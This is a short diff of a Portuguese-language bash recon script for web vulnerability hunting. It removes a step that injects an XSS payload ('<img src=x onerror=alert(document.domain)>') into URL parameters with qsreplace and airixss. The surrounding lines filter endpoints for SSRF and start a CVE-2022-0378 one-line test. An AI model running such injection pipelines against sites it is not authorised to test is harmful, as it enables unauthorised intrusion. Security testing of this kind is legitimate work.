@@ -283,11 +283,6 @@ cat "$folder/EndpointsL.txt" | uro | gf ssrf | anew "$folder/ssrf.txt"
 
 echo -e "\e[32mExecutando Testes de Vulnerabilidade\e[0m"
 
-# teste xss
-echo -e "\e[32mExecutando qsreplace xss...\e[0m"
-cat "$folder/xss.txt" | uro | grep "=" | qsreplace '<img src=x onerror=alert(document.domain)>' | airixss -payload "alert(document.domain)" | egrep -v 'Not' > "$folder/qsreplaceVul.txt"
-echo -e "\e[1;31m$(wc -l < "$folder/qsreplaceVul.txt")\e[0m"
-
 # One-line test
 # One-line CVE-2022-0378
 echo -e "\e[32mCVE-2022-0378 One-line\e[0m"
